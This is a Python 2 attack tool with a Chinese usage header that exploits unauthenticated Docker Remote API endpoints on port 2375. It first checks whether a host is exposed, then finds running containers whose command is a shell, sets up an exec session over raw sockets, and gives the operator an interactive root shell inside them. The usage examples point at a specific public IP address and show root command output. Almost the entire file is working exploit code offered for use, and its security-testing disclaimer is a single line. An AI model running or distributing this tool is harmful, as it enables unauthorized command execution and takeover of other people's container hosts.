#!/usr/bin/env python
# -*- coding:utf-8 -*-
from urlparse import urlparse, urlunparse, urljoin
import json,socket
import time
import argparse

notice = u'''Docker Remote API 未授权漏洞ToolV1.0
#    Author: CF_HB
#    CreatedTime: 2016-05-18
#    漏洞介绍:(http://drops.wooyun.org/papers/15892)
#    该工具仅做参考，最好在Linux下使用，因为Windows下字体显示很不好看。
#V1.0功能说明:
#     1) 漏洞检查
#     2) 获取可控制的docker并获取bash shell执行命令
#To Do:
#     1) 学习Docker更多的使用
#     2) 实现远程目录加载到本地
#     3) 探索docker的用法
#用法说明如下:
#     1) 检查目标URL是否存在Docker Remote Api未授权访问漏洞用法
#     usage: python DockerRemoteApiToolV1.0.py -url http://121.43.147.207:2375/ -step check
#     2) 获取可控制的docker并获取bash shell执行命令
#     usage: python DockerRemoteApiToolV1.0.py -url http://121.43.147.207:2375/ -step getshell
# 提示1:
# You Can Control: 1 dockers--------------你可以get bash shell控制有1个docker
# ----------------------------------------
# ID:1. #System:alpine #b23b7f3dc593#sh---编号:1. docker系统类型: alpine #docker的编号# shell类型
# Enter 'q' for quit.---------------------输入字母q退出选择
# The ID:---------------------------------输入要获得shell的ID编号
# 提示2:
# The ID:1---------------------------------我要获得编号1
# 1
# Enter 'q' for quit.---------------------输入字母q退出bash shell
# $:id
# / # id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
# / #
# Enter 'q' for quit.---------------------输入字母q退出bash shell
# $:
# 以上是所有的使用说明.
#####声明:
#       本脚本仅用于安全测试，请勿用于违法犯罪!
#       bug反馈: http://heysec.org/留言
#       欢迎反馈bug和提出改进建议
'''

class WavsPlugin():
    def choosedocker(self,sock, DocerVulns):
        total = len(DocerVulns)
        while True:
            print "You Can Control: "+str(len(DocerVulns))+" dockers"
            for docker in DocerVulns:
                print '--'*15
                print docker
            print "Enter 'q' for quit."
            dockerid = raw_input("The ID:")
            if dockerid == "q":
                break
            try:
                num = int(dockerid) - 1
                if num in range(0, total):
                    print dockerid
                    Id = DocerVulns[num].split("#")[2]
                    Command = DocerVulns[num].split("#")[3]
                    self.getexec(sock, Id, Command)
            except Exception, e:
                print "something error..try again.."
        print "bye bye..."
        sock.close()
        return

    def getexec(self, sock, Id, Command):
        # print "Command: "+Command
        # print "Id: "+Id
        # Created My Id
        # 12 bytes of Id
        ContainerId = Id
        execDockerPOSTOne = '''\
POST /v1.20/containers/ContainerId/exec HTTP/1.1
Host: 115.123.123.123:2375
User-Agent: Docker-Client/1.8.0 (windows)
Content-Length: 156
Content-Type: application/json
Accept-Encoding: gzip

{"User":"","Privileged":false,"Tty":true,"Container":"ContainerId","AttachStdin":true,"AttachStderr":true,"AttachStdout":true,"Detach":false,"Cmd":["Command"]}
'''
        execDockerPOSTOne = execDockerPOSTOne.replace('ContainerId', ContainerId).replace('Command', Command)
        sock.sendall(execDockerPOSTOne)
        createInfo = sock.recv(1024*10)
        # print createInfo
        strlist = createInfo.split('\n')
        CreatedId = json.loads(strlist[6])['Id']
        # print "CreatedId = " + CreatedId

        execDockerTwo = "/v1.20/exec/"+Id+"/resize?h=33&w=80"
        execDockerPOSTtwo = '''\
POST /v1.20/exec/CreatedId/start HTTP/1.1
Host: 115.123.123.79:2375
User-Agent: Docker-Client/1.8.0 (windows)
Content-Length: 163
Connection: Upgrade
Content-Type: text/plain
Upgrade: tcp

{"User":"","Privileged":false,"Tty":true,"Container":"ContainerId","AttachStdin":true,"AttachStderr":true,"AttachStdout":true,"Detach":false,"Cmd":["Command"]}
'''
        execDockerPOSTtwo = execDockerPOSTtwo.replace('ContainerId', ContainerId).replace('Command', Command)
        execDockerPOSTtwo = execDockerPOSTtwo.replace("CreatedId", CreatedId)
        time.sleep(1)
        sock.sendall(execDockerPOSTtwo)
        startinfo = sock.recv(1024*10)
        while True:
            print "nter q for quit."
            cmd = raw_input("$:")
            sock.sendall(cmd+'\x0d')
            time.sleep(2)
            if "q" == cmd:
                return
            print sock.recv(1024*10)

    def cmd_run(self, url, step):
        print notice
        urlinfo = urlparse(url)
        baseurl = urlunparse((urlinfo.scheme, urlinfo.netloc, '/', '', '', ''))
        print "Checking "+baseurl
        host, port = urlinfo.netloc.split(":")
        socket.setdefaulttimeout(5)
        try:
            poc = "containers/json"
            psall = "v1.20/containers/json?all=1"
            pocget = '''GET '''+baseurl+poc+''' HTTP/1.1\r\nHost: '''+host+":"+port+'''\r\n\r\n'''
            psget = '''GET '''+baseurl+psall+''' HTTP/1.1\r\nHost: '''+host+":"+port+'''\r\n\r\n'''

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (host, int(port))
            sock.connect(server_address)
            if "check" == step:
                sock.sendall(pocget)
                time.sleep(2)
                pocinfo = sock.recv(1024*10)
                if "Command" in pocinfo and "Server: Docker" in pocinfo:
                    print "{url} is vulnerable.".format(url=url)
                else:
                    print "{url} is not vulnerable.".format(url=url)
                exit(0)

            sock.sendall(psget)
            time.sleep(2)
            psinfo = sock.recv(1024*200)
            strlist = psinfo.split('\r\n')
            dockerpsstr = strlist[7]

            decoded = json.loads(dockerpsstr)

            DocerVulns = []
            count = 1
            Command = ""
            Id = ""
            accessCommand = ['sh', '/bin/sh', '/bin/bash', 'bash', '/bin/csh', 'csh',
                             '/bin/ksh', 'ksh', '/bin/tcsh', 'tcsh', '/bin/zsh', 'zsh']
            for i in decoded:
                if ("Up" in i['Status']) and ("Exited" not in i['Status']) and (i['Command'] in accessCommand):
                    Command = i['Command']
                    Id = i['Id']
                    ImageName = i['Image']
                    dockervuln = "ID:"+str(count)+". #System:"+ImageName+" #"+Id[0:12]+"#"+Command
                    DocerVulns.append(dockervuln)
                    count = count + 1

            if len(DocerVulns) == 0:
                print "nothing can be used!"
                sock.close()
                return
            else:
                self.choosedocker(sock, DocerVulns)
                sock.close()
        except Exception, e:
            print "Failed to connection target"
            exit(0)
            sock.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='the target url.')
    parser.add_argument('-step', help='check|getshell')
    args = parser.parse_args()
    args_dict = args.__dict__
    plg = WavsPlugin()

    try:
        if not (args_dict['url'] == None):
            url = args_dict['url']
        if not (args_dict['step'] == None):
            step = args_dict['step']

            plg.cmd_run(url,step)
        else:
            print parser.print_usage()
            exit(0)
    except Exception,e:
        print parser.print_usage()
        exit(-1)
